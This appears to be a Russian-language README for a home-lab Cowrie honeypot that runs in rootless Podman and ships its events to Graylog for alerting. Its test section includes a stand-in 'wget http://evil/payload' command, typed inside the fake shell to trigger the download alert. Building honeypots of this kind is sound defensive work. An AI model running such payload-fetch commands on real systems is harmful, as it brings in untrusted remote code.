# Cowrie honeypot + GELF-шиппер

SSH/Telnet-ловушка на базе [Cowrie](https://github.com/cowrie/cowrie) в rootless Podman
с доставкой событий в Graylog (GELF UDP). Часть домашней лаборатории мониторинга.

## Состав

| Файл | Назначение |
|---|---|
| `container/cowrie.container` | Quadlet самого Cowrie (порты 2222 SSH, 2223 Telnet) |
| `container/cowrie-shipper.container` | Quadlet шиппера логов |
| `shipper.py` | Хвост `cowrie.json` → GELF UDP (только stdlib) |
| `Containerfile.shipper` | Образ шиппера (python:3.13-alpine) |
| `tests/test_shipper.py` | Тесты парсера событий |

## Развёртывание (RED OS 8, rootless podman)

```bash
mkdir -p ~/cowrie/{etc,data}
# конфигурация Cowrie
printf '[honeypot]\nhostname = nas02\n' > ~/cowrie/etc/cowrie.cfg
# userdb: любой пароль для root и admin
printf 'root:x:*\nadmin:x:*\n' > ~/cowrie/etc/userdb.txt
# подкаталоги данных
mkdir -p ~/cowrie/data/lib/cowrie/{downloads,tty} ~/cowrie/data/log/cowrie \
         ~/cowrie/data/share/cowrie ~/cowrie/data/tmp
# владелец — uid 999 внутри контейнера (через podman unshare!)
podman unshare chown -R 999:999 ~/cowrie/data

# образы
podman pull docker.io/cowrie/cowrie:latest
podman build -f Containerfile.shipper -t localhost/cowrie-shipper:latest .

# quadlet'ы
mkdir -p ~/.config/containers/systemd
cp container/*.container ~/.config/containers/systemd/
systemctl --user daemon-reload
systemctl --user start cowrie.service cowrie-shipper.service
```

## Грабли

- **SELinux**: тома монтировать с `:z` (общая метка), не `:Z` — иначе Cowrie не может
  писать `cowrie.json`, а шиппер не может его читать (разные MCS-категории).
- Права на `~/cowrie/data` выставлять через `podman unshare chown` — обычный chown
  не видит подuid контейнера.
- Cowrie не поддерживает exec-запросы (`ssh host command`) — только интерактивный
  shell; для боевой проверки используйте `sshpass -p ... ssh -tt -p 2222`.

## Проверка

```bash
sshpass -p SuperPass123 ssh -tt -o StrictHostKeyChecking=no -p 2222 root@<хост>
# внутри псевдошелла: whoami, ls, wget http://evil/payload
```

События попадают в Graylog (вход GELF UDP 12206) с полями `tool=cowrie`,
`event=<eventid>` (`cowrie.login.success`, `cowrie.command.input`,
`cowrie.session.file_download` и т.д.). Поток **Cowrie**, правила алертинга
«COWRIE - Успешный вход», «COWRIE - Команда», «COWRIE - Скачивание файла».

## Тесты

```bash
python -m pytest tests/ -v
```
